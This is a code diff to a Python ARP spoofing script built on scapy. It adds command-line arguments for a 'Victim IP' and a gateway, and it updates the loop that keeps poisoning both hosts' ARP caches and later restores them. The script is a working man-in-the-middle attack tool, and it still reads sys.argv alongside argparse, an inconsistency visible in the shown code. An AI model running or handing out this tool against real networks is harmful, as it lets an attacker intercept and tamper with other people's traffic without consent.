@@ -3,6 +3,16 @@
 
 import scapy.all as scapy 
 import sys,time
+import argparse
+
+def get_arguments():
+    parser =  argparse.ArgumentParser(prog='ProgramName',description='What the program does', epilog='Text at the bottom of help')
+    parser.add_argument('-t', '--target', dest='target_ip',  help='Victim IP')
+    parser.add_argument('-g', '--gateway', dest='gateway_ip', help='Router ip/Gateway IP')
+
+    args = parser.parse_args()
+    return args
+
 def get_mac(ip):
     ''' The first ARP will asks for only 0.0.0.0 but no specific ip'''
     # scapy.ls(scapy.ARP())
@@ -39,16 +49,17 @@ Remember to add cho 1> /proc/sys/net/ipv4/ip_forward to your Linux Machine to al
 target_ip = sys.argv[1]
 gateway_ip = sys.argv[2]
 
+args = get_arguments()
 try:
     packet_count = 0
     while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
+        spoof(args.target_ip, args.gateway_ip)
+        spoof(args.gateway_ip, args.target_ip)
         packet_count = packet_count + 2
         print("\r[+] Packet Sent : " + str(packet_count), end="")
         time.sleep(2)
 
 except KeyboardInterrupt:
     print("\n[-] Keyboard Interrupt, CTRL + C Quitting... Wait a little")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
+    restore(args.target_ip, args.gateway_ip)
+    restore(args.gateway_ip, args.target_ip)
